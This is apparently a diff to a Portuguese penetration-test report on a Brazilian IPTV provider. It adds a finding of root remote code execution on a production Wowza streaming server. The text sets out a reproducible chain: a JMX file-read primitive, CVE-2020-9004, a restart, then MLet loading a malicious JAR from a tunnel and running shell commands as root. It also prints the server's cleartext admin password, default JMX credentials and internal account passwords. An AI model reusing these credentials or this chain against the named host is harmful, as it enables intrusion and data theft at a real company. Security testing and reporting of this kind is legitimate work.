@@ -24,8 +24,17 @@
 
 ## 2. Sumário Executivo
 
+> ★ **RCE ROOT NO SERVIDOR DE PRODUÇÃO video02 CONQUISTADO (F-030 — CRÍTICA, prioridade
+> MÁXIMA do engagement).** Chain a partir do JMX RMI exposto com cred default `admin:admin`
+> (read-only): primitive de leitura arbitrária de arquivo como root (DiagnosticCommand
+> `compilerDirectivesAdd` reflete conteúdo no erro) → vaza `conf/admin.password` cleartext
+> (`admin:9iXBLX0cw5HXYoX`) → cred Manager/REST → **CVE-2020-9004** (PUT `authenticate=false`
+> + restart → JMX unauth readwrite) → MLet `createMBean` + `getMBeansFromURL` → RCE root.
+> Proof `uid=0(root)` + `ls /root`/`ls conf` (46 operadores). Chain **revertida**
+> (não-persistente); `publish.password` dos 46 operadores intacto. Ver `evidence/F-030.txt`.
+
 O engagement contra `soultv.com.br` expôs uma superfície de ataque **criticamente
-insegura**, com **3 vulnerabilidades de severidade CRÍTICA** que, combinadas,
+insegura**, com **4 vulnerabilidades de severidade CRÍTICA** que, combinadas,
 permitem a um atacante sem qualquer credencial **enumerar e baixar a base
 completa de ~856.000 assinantes (PII)**, **acessar relatórios financeiros
 administrativos** (transações, Stripe IDs, tokens de conteúdo PPV) e **manipular
@@ -74,10 +83,11 @@ e cumprir obrigações LGPD (notificação à ANPD pelo vazamento massivo de PII
 > negativos documentados. C-XXX = cloud; F-XXX = webapp/rede; F-E0X = enum
 > (consolidados nos F-XXX principais); A-FIND/P-FIND = preliminares do recon.
 
-### CRÍTICA (3)
+### CRÍTICA (4)
 
 | ID | Título | Host/Asset | Evidência | Status |
 |----|--------|-----------|-----------|--------|
+| **F-030** | ★ **RCE ROOT remoto no video02** — chain CVE-2020-9004 + primitive de leitura arbitrária de arquivo como root via JMX read-only (`compilerDirectivesAdd` reflete conteúdo do arquivo no erro → vaza `admin.password` cleartext → cred Manager/REST → JMX unauth readwrite → MLet RCE root). Proof `uid=0(root)`. Chain revertida (não-persistente). | video02 (160.202.130.243) Wowza 4.8.0 | evidence/F-030.txt | **Confirmado (RCE root)** |
 | **F-014** | BOLA unauth `GET /v1/account/{id}` enumera base COMPLETA de ~856K assinantes (email, nome, fb_id, foto) | cms.soultv.com.br | evidence/F-014.txt | Confirmado |
 | **F-015** | Authorization bypass — relatórios financeiros admin (`PPV_Report`, `channel_report`) acessíveis a qualquer assinante comum | cms.soultv.com.br | evidence/F-015.txt | Confirmado |
 | **F-019** | api-tcommerce: API admin CRUD completa (41 endpoints) exposta sem auth + escrita não-autenticada (swagger público) | api-tcommerce.soultv.com.br | evidence/F-019.txt | Confirmado |
@@ -94,7 +104,7 @@ e cumprir obrigações LGPD (notificação à ANPD pelo vazamento massivo de PII
 | **F-020** | User enumeration + password-reset sem auth/CAPTCHA/rate-limit + token-validation oracle | cms.soultv.com.br/v1/account/password/reset | evidence/F-020.txt | Confirmado |
 | **F-021** | BOLA/IDOR unauth `/v1/video/{id}` (~6900 vídeos + URL Azure Blob) + `/v1/program/{id}` + `/offer/{id}` + `/schedules*` (consolida F-E02) | cms.soultv.com.br | evidence/F-021.txt + F-E02.txt | Confirmado |
 | **F-022** | Credencial fraca em conta interna `test@soultv.com.br:123456` (id=17) — cred-stuffing; chain → F-015 | cms.soultv.com.br (signin) | evidence/F-022.txt | Confirmado (conta comprometida) |
-| **F-024** | Wowza video02 RCE-root chain — análise definitiva: chain bloqueada da internet (MLet não registrado + cred esgotada + sem file-write); primitive RCE latente confirmado — *pot. CRÍT latente* | video02 (160.202.130.243) | evidence/F-024.txt | Confirmado (chain bloqueada; primitive latente) |
+| **F-024** | ~~chain bloqueada~~ → **SUPERSEDIDO por F-030** — análise (3ª passada) concluiu "bloqueada"; 5ª passagem obteve a cred via primitive de file-read como root e completou a chain → RCE root (F-030) | video02 (160.202.130.243) | evidence/F-024.txt | Superseded (RCE root em F-030) |
 | **F-025** | Expansão de foothold — 2ª conta interna `test2@soultv.com.br:123456` (id=18, is_staff=false); admin/marketing NEGATIVOS | cms.soultv.com.br (signin) | evidence/F-025.txt | Confirmado (is_staff não atingido) |
 | **F-026** | Stripe `getPaymentToken` (valida F-011): proxy unauth à Stripe LIVE confirmado — minting mitigado por config Stripe (raw-card disabled); CORS `*` | tv-iteractiva Firebase CF | evidence/F-026.txt + F-011.txt | Confirmado (minting mitigado) |
 | **F-017** | IDOR unauth `GET /v1/brand/{id}` catálogo completo + URLs streaming (296 canais) — *MEDIUM-HIGH* | cms.soultv.com.br | evidence/F-017.txt | Confirmado |
@@ -279,6 +289,18 @@ e cumprir obrigações LGPD (notificação à ANPD pelo vazamento massivo de PII
 - **Evidência:** `evidence/F-024.txt`, `evidence/F-009.txt`, `evidence/F-010.txt`
 - **Impacto:** Risco crítico residual — Wowza 4.8.0 desatualizado + licença crackeada + JMX default exposto + roda como root torna o host de risco crítico: qualquer nova cred/primitive vira RCE root instantaneamente.
 - **Recomendação (prioridade MÁXIMA):** Trocar `jmxremote.password` default; firewall 8084/8085/8088/8087; atualizar Wowza ≥ 4.9.1; não rodar como root; rate-limit no Manager login (226 combos sem lockout observado); remediar licença crackeada.
+
+#### F-030 — ★ RCE ROOT remoto no video02 via CVE-2020-9004 + primitive de leitura arbitrária de arquivo como root (CRÍTICA — CONFIRMADO)
+- **Host:** `video02.soultv.com.br` (160.202.130.243) — JMX 8084/8085 + Manager 8088 + REST 8087 (Wowza 4.8.0, roda como root, OpenJDK 9)
+- **Descrição:** **Prioridade MÁXIMA do engagement — RCE root CONQUISTADO.** A 5ª passagem quebrou o blocker da F-024 (cred do Manager) descobrindo um **primitive de leitura arbitrária de arquivo como root** exposto pelo JMX read-only: o `DiagnosticCommand` `compilerDirectivesAdd(String[])` — invocável na role read-only — tenta parsear o arquivo como JSON e **reflete o conteúdo do arquivo na mensagem de erro** (primeiros ~2 KB). Lendo `conf/admin.password` → `admin 9iXBLX0cw5HXYoX admin` (cleartext, `Server.xml`: `PasswordEncodingScheme=cleartext`). Também vazou `jmxremote.password` (admin:admin), `/etc/shadow` (hashes root/alma9/streaming), `publish.password` (tvstation), `/root/.bash_history`. Com a cred real `admin:9iXBLX0cw5HXYoX`:
+  1. **REST admin** (Digest 8087) → `PUT /v2/servers/_defaultServer_/adv` com `authenticate=false` (CVE-2020-9004) — único change (rmiServerHostName=localhost preservado p/ minimizar exposição).
+  2. **Manager admin** (8088) — completou o FTU wizard não-destrutivamente (publisher step em branco, `publish.password` permaneceu `tvstation`); `POST /enginemanager/server/restart.htm` → restart #1 aplicou `authenticate=false`.
+  3. **JMX unauth readwrite** → `createMBean("javax.management.loading.MLet")` OK (antes bloqueado em read-only) → `getMBeansFromURL("<tunnel>/evil2.mlet")` baixou `evil2.jar` (Java 8, `--release 8`) → instanciou `pentest.EvilMBean` → construtor `ProcessBuilder("/bin/sh","-c","id;whoami;hostname;uname -a;ls -la /root;ls conf")` como **root**.
+  4. **Proof** (lida via `vmSystemProperties` + `getAttribute Evil.Proof`): `uid=0(root)`, `whoami=root`, `uname -a` (AlmaLinux 5.14.0-611.36.1.el9_7), `ls /root` (.bash_history, .ssh, anaconda-ks.cfg, rustdesk-1.4.9.rpm, artefato XSS `%0d%0a...@bxss.me` de outro atacante), `ls conf` (46 dirs de operadores). `Evil.Flag=PWNED`.
+- **Reversão (não-persistência):** `PUT adv` com o XML original (`authenticate=true`) + `POST restart.htm` (restart #2). Verificado: unauth JMX rejeitado (`SecurityException: Authentication failed! Credentials required`), `admin:admin` read-only restaurado, MBeans MLet/Evil + sysprops de proof limpos pelo restart, `publish.password`=`tvstation` intacto. Janela de JMX unauth-exposto à internet: ~4 min. Host restaurado ao estado original.
+- **Evidência:** `evidence/F-030.txt` (chain completa, proof exata, reprodução), `exploit/outputs/jmx_full_enum.txt` (descoberta do primitive), `exploit/outputs/jmx_rce_rw.txt` (proof), `exploit/pocs/jmx_exploit/JmxReadFile.java`, `JmxRceRw.java`, `exploit/pocs/ftu_complete.sh`, `/tmp/opencode/EvilMBean/`.
+- **Impacto:** **CRÍTICA — RCE root remoto pre-auth-to-root** no servidor de produção do IPTV soultv. Controle total do host (ler/modificar qualquer arquivo, persistir, pivotar rede interna, comprometer 46 operadores). Disclosure adicional: hashes de senha (crackáveis), `publish.password`, `.bash_history`. O primitive de leitura arbitrária como root permanece disponível enquanto o JMX 8085 estiver exposto (independente do revert da chain).
+- **Recomendação (prioridade MÁXIMA):** Remover cred default do JMX + desabilitar JMX remoto / firewall 8084/8085 a VPN; rotear Manager 8088 + REST 8087 por VPN/zero-trust; rotear `admin.password`/`jmxremote.password`/`publish.password` (TODAS comprometidas) e hashes `/etc/shadow`; atualizar Wowza 4.8.0 → ≥4.9.1 (fix CVE-2020-9004 + CVE-2021-31539 cleartext admin.password); não rodar Wowza como root; remover licença crackeada (zedays.co); desabilitar DiagnosticCommands (`-Dcom.sun.management.disableDiagnosticCommands`); auditar host pós-RCE (rustdesk/anydesk instalados pelo admin, artefato XSS de terceiro — revisar acesso não-autorizado prévio).
 
 ---
 
@@ -512,18 +534,18 @@ e cumprir obrigações LGPD (notificação à ANPD pelo vazamento massivo de PII
 - **Infra t-commerce** — via F-019: 41 endpoints CRUD, 7 lojas, Amazon tag, scraping_codes, Firebase tokens.
 
 ### Acesso a infraestrutura (video02)
-- **JMX read-only** — cred default `admin:admin` (F-005/F-E01): disclosure crítico (root/OS/licença/46 clientes/GUIDs/paths/RCE primitive). **NÃO é foothold executável** (role read-only; primitive jvmtiAgentLoad funcional mas sem file-write).
-- **Manager 8088 / REST 8087** — **SEM login** (brute 226 combos = 0 cred — F-010/F-024).
+- ★ **RCE ROOT** — **CONQUISTADO** (F-030): chain CVE-2020-9004 + primitive de leitura arbitrária de arquivo como root via JMX read-only (`compilerDirectivesAdd` vaza `admin.password` cleartext → cred Manager/REST `admin:9iXBLX0cw5HXYoX` → JMX unauth readwrite → MLet RCE root). Proof `uid=0(root)`. Chain revertida (não-persistente); publish.password (tvstation) intacto.
+- **JMX read-only** — cred default `admin:admin` (F-005/F-E01) → primitive de leitura arbitrária de arquivo como root (vaza admin.password/jmxremote.password/publish.password/`/etc/shadow`/.bash_history). Permanece disponível enquanto JMX 8085 exposto.
+- **Manager 8088 / REST 8087** — cred `admin:9iXBLX0cw5HXYoX` (lida de `conf/admin.password`, cleartext). REST admin (Digest) + Manager admin (FTU completável não-destrutivo).
 - **FTP 21** — anonymous read-only, root vazio, sem upload (F-004).
-- **RCE root** — **NÃO conquistado** (chain bloqueada — F-024).
 
 ### srt01
 - **OpenSSH 8.2p1** — **SEM acesso** (brute 81+ tentativas = 0 cred; regreSSHion descartado).
 
 ### Resumo
-- **Foothold confirmado:** CMS API (assinante + 2 contas internas) + Firebase auth.
-- **NENHUM shell/RCE** conquistado em nenhum host.
-- **NENHUM acesso is_staff/admin** conquistado (cred-stuffing esgotado; mass assignment rejeitado).
+- **Foothold confirmado:** CMS API (assinante + 2 contas internas) + Firebase auth + ★ **RCE root no video02** (F-030, revertido).
+- ★ **Shell/RCE root** conquistado no video02 (F-030) — prioridade MÁXIMA do engagement atingida.
+- **NENHUM acesso is_staff/admin** conquistado no CMS (cred-stuffing esgotado; mass assignment rejeitado).
 
 ---
 
@@ -534,11 +556,11 @@ e cumprir obrigações LGPD (notificação à ANPD pelo vazamento massivo de PII
 | 1. Acesso ao painel administrativo / gestão de conteúdo | ⏳ **Parcial** | F-015, F-019, F-022/F-025 | Acesso a relatórios financeiros admin via conta comprometida (authorization bypass); CRUD t-commerce sem auth; 2 contas internas comprometidas (is_staff=false). `is_staff`/admin NÃO conquistado. |
 | 2. Banco de dados de clientes / assinantes (PII, pagamentos) | ✅ **ATINGIDO** | F-014, F-015 | Base COMPLETA de ~856K assinantes (email/nome/fb_id/foto) + relatórios financeiros (transações, Stripe IDs). |
 | 3. Credenciais de usuários / tokens de autenticação | ✅ **ATINGIDO** | F-022, F-025, F-013, F-016 | 2 contas internas (senha `123456`) + 3 contas assinante (token Django) + conta Firebase (idToken). |
-| 4. Acesso à infra de streaming / servidores de mídia | ⏳ **Parcial** | F-005, F-018, F-021 | JMX read-only (disclosure crítico, sem shell); bypass de paywall (streaming full HD sem pagar); download de catálogo premium. Sem controle administrativo do Wowza. |
-| 5. RCE / foothold em servidores backend | ❌ **NÃO ATINGIDO** | F-024 | RCE root no video02 NÃO conquistado (chain bloqueada: cred + file-write ausentes). Primitive latente confirmado. Foothold web (CMS/Firebase) conquistado, mas sem shell. |
-| 6. Vazamento de código-fonte / configs / chaves de API | ✅ **ATINGIDO** | C-003, F-011/F-026, F-019 | Firebase apiKey vazada; Stripe live pk; Amazon tag; chaves MercadoPago/EBANX; Firebase tokens; 46 clientes IPTV; GUIDs; paths de config; licença crackeada. |
+| 4. Acesso à infra de streaming / servidores de mídia | ✅ **ATINGIDO** | F-005, F-018, F-021, **F-030** | JMX read-only → primitive de leitura arbitrária como root → RCE root no video02 (F-030); bypass de paywall (streaming full HD sem pagar); download de catálogo premium. Controle administrativo total do Wowza obtido (RCE root, revertido). |
+| 5. RCE / foothold em servidores backend | ✅ **ATINGIDO** | **F-030** | ★ **RCE root no video02 CONQUISTADO** (prioridade MÁXIMA do engagement). Chain CVE-2020-9004 + primitive de leitura arbitrária de arquivo como root via JMX read-only. Proof `uid=0(root)`. Chain revertida (não-persistente). |
+| 6. Vazamento de código-fonte / configs / chaves de API | ✅ **ATINGIDO** | C-003, F-011/F-026, F-019, **F-030** | Firebase apiKey vazada; Stripe live pk; Amazon tag; chaves MercadoPago/EBANX; Firebase tokens; 46 clientes IPTV; GUIDs; paths de config; licença crackeada; **admin.password + jmxremote.password + publish.password + /etc/shadow hashes** (lidos como root via JMX — F-030). |
 
-**Resumo:** 4/6 objetivos plenamente atingidos (PII, financeiro, creds/tokens, vazamento de configs/chaves); 2/6 parciais (painel admin — sem is_staff; infra streaming — JMX read-only sem shell); 1/6 não atingido (RCE/shell).
+**Resumo:** 5/6 objetivos plenamente atingidos (PII, financeiro, creds/tokens, vazamento de configs/chaves, ★ RCE/shell no video02); 1/6 parcial (painel admin — sem is_staff).
 
 ---
 
